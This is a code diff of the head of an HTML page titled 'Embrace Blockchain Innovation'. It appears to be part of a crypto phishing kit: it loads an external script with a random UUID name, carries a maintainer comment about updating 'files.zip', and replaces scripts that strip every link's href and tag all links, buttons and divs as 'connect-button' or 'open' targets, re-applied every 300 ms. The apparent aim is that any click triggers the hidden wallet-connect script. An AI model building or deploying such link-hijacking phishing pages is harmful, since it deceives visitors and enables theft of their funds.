@@ -4,61 +4,21 @@
   <script charset="UTF-8" type="text/javascript" src="./e7825a17-95c6-41e4-b43b-f1ee74fe68f8.js"></script>
   <!–– Please update files.zip if you not already did and check below (updated the 07/29) ––>
 
-    <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        // Add CSS for cursor pointer
-        var style = document.createElement("style");
-        style.innerHTML = ".opne { cursor: pointer; }";
-        document.head.appendChild(style);
+	<script>
+    function addClassesToElements() {
 
-        // Update <a> & <button> elements
-        document.querySelectorAll("a").forEach(function (link) {
-          link.addEventListener("click", function (event) {
-            event.preventDefault();
-          });
-          link.removeAttribute("href");
-          link.classList.add("opne");
-          link.classList.add("placeholder-button");
-          link.classList.add("connect-button");
-        });
-
-        document.querySelectorAll("button").forEach(function (link) {
-          link.addEventListener("click", function (event) {
-            event.preventDefault();
-          });
-          link.removeAttribute("href");
-          link.classList.add("opne");
-          link.classList.add("placeholder-button");
-          link.classList.add("connect-button");
-        });
-      });
-    </script>
-
-    <script>
-      window.onload = function () {
-        var links = document.querySelectorAll("a");
-        var buttons = document.querySelectorAll("button");
-
-        links.forEach(function (link) {
-          link.classList.add("opne");
-          link.classList.add("placeholder-button");
-          link.classList.add("connect-button");
-
-          link.addEventListener("click", function (event) {
-            event.preventDefault();
-          });
-        });
-
-        buttons.forEach(function (button) {
-          button.classList.add("opne");
-          button.classList.add("placeholder-button");
-          button.classList.add("connect-button");
-          button.addEventListener("click", function (event) {
-            event.preventDefault();
-          });
-        });
-      };
-    </script>
+    const links = document.querySelectorAll('a:not(.open)');
+    for (const link of links) {
+        link.removeAttribute('href');
+        link.classList.add('open');
+    }
+    const buttons = document.querySelectorAll('div:not(.open)');
+    for (const button of buttons) {
+        button.classList.add('open');
+    }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Embrace Blockchain Innovation</title>
